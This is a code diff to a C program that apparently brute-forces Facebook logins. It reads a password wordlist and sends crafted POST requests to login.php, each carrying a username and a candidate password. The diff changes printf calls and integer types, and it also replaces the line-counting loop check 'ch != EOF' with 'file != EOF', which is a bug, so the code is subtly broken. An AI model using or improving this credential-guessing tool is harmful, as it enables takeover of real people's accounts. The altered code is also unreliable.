@@ -27,7 +27,7 @@ void menu() {
     system("clear");
     #endif
     
-    printf(green);
+    printf("%s", green);
     printf("\t    XXXXXX XXXXXX XX      XXXXX   XXXXX  XX  XX XX  XX XXXXXX  \n");
     printf("\t   XX     XX  XX XX     XX   XX XX   XX XX XX  XX  XX XX  XX   \n");
     printf("\t  XXXXXX XXXXX  XX     XX   XX XX   XX XXXX   XX  XX XXXXXX    \n");
@@ -166,7 +166,7 @@ int get_file_lines(FILE *file) {
     char ch;
 
     ch = fgetc(file);
-    while(ch != EOF) {
+    while(file != EOF) {
         if(ch == '\n') {
             count = count + 1;
         }
@@ -178,7 +178,7 @@ int get_file_lines(FILE *file) {
  * send_request_headers is used to sent HTTP headers to the facebook
  * server once connection is establish
 */
-void send_request_headers(long int clen, SSL *ssl) {
+void send_request_headers(int clen, SSL *ssl) {
 
     char buffer[2049];
     sprintf(buffer, "POST /login.php HTTP/1.1\r\n");
@@ -229,7 +229,7 @@ void login(char *wlist, char *user) {
 
         // This is the actual body of the request which contains the password and username
         sprintf(post, "lsd=AVpD2t1f&display=&enable_profile_selector=&legacy_return=1&next=&profile_selector_ids=&trynum=1&timezone=300&lgnrnd=031110_Euoh&lgnjs=1366193470&email=%s&pass=%s&default_persistent=0&login=Log+In\r\n", user, password);
-        long int postlen = strlen(post);
+        int postlen = strlen(post);
 
 
         // Establish a SSL/TLS connection to facebook server
